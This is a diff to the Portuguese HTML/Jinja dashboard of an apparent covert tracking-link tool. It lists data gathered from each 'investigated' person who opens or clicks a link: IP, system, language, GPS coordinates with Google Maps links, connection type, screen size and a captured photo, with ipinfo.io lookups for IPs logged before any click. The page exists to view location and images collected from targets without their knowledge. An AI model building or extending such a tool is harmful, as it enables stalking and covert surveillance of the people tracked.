@@ -13,16 +13,21 @@
 
         h2 {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+        }
+
+        .table-container {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-bottom: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
         }
 
         table {
             width: 100%;
             border-collapse: collapse;
             background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
         }
 
         th, td {
@@ -33,6 +38,9 @@
 
         th {
             background-color: rgba(0, 184, 148, 0.6);
+            position: sticky;
+            top: 0;
+            z-index: 1;
         }
 
         img {
@@ -75,37 +83,73 @@
     </style>
 </head>
 <body>
-    <h2>📊 Registros Recentes</h2>
-    <table>
-        <tr>
-            <th>Data</th><th>IP</th><th>Sistema</th><th>Navegador</th><th>Idioma</th>
-            <th>Localização</th><th>Conexão</th><th>Tempo</th><th>Resolução</th><th>Foto</th>
-        </tr>
-        {% for r in registros %}
-        <tr>
-            <td>{{ r.data_hora.strftime("%d/%m/%Y %H:%M:%S") }}</td>
-            <td>{{ r.ip }}</td>
-            <td>{{ r.sistema }}</td>
-            <td>{{ r.navegador }}</td>
-            <td>{{ r.idioma }}</td>
-            <td>{{ r.latitude }}, {{ r.longitude }}</td>
-            <td>{{ r.conexao }}</td>
-            <td>{{ r.tempo_segundos }}s</td>
-            <td>{{ r.largura_tela }}x{{ r.altura_tela }}</td>
-            <td>
-                {% if r.foto_base64 %}
-                    <img src="{{ r.foto_base64 }}" width="80">
-                {% else %}
-                    Nenhuma
-                {% endif %}
-            </td>
-        </tr>
-        {% endfor %}
-    </table>
+    <h2>📊 Registros de captura (Após clicar) </h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>Investigado</th><th>Data</th><th>IP</th><th>Sistema</th><th>Idioma</th>
+                <th>Localização</th><th>Conexão</th><th>Tempo</th><th>Resolução</th><th>Foto</th>
+            </tr>
+            {% for r in registros %}
+            <tr>
+                <td>{{ r.link.nome_investigado if r.link else '---' }}</td>
+                <td>{{ r.data_hora.strftime("%d/%m/%Y %H:%M:%S") }}</td>
+                <td>{{ r.ip }}</td>
+                <td>{{ r.sistema }}</td>
+                <td>{{ r.idioma }}</td>
+                <td>
+                    {{ r.latitude }}, {{ r.longitude }}<br>
+                    {% if r.latitude and r.longitude %}
+                        <a href="https://www.google.com/maps?q={{ r.latitude }},{{ r.longitude }}" 
+                           target="_blank"
+                           style="font-size: 12px; color: #3b82f6; text-decoration: none;">
+                           🗺️ Ver no Mapa
+                        </a>
+                    {% endif %}
+                </td>
+                <td>{{ r.conexao }}</td>
+                <td>{{ r.tempo_segundos }}s</td>
+                <td>{{ r.largura_tela }}x{{ r.altura_tela }}</td>
+                <td>
+                    {% if r.foto_base64 %}
+                        <img src="{{ r.foto_base64 }}" width="80">
+                    {% else %}
+                        Nenhuma
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <h2>📥 IPs Capturados ao Acessar o Link (Antes do Clique)</h2>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>Investigado</th>
+                <th>Data</th>
+                <th>IP</th>
+            </tr>
+            {% for ip in ips_iniciais %}
+            <tr>
+                <td>{{ links[ip.slug] if ip.slug in links else '---' }}</td>
+                <td>{{ ip.data_hora.strftime("%d/%m/%Y %H:%M:%S") }}</td>
+                <td>
+                    {{ ip.ip }}<br>
+                    <a href="https://ipinfo.io/{{ ip.ip }}" 
+                       target="_blank" 
+                       class="mapa-btn" 
+                       style="margin-top: 5px; display: inline-block;">
+                       🔍 Ver Provedor
+                    </a>
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+    </div>
 
     <div style="text-align:center; margin-top: 20px;">
         <a href="/gerenciar" class="voltar">⬅ Voltar ao Gerenciamento</a>
     </div>
 </body>
-
 </html>
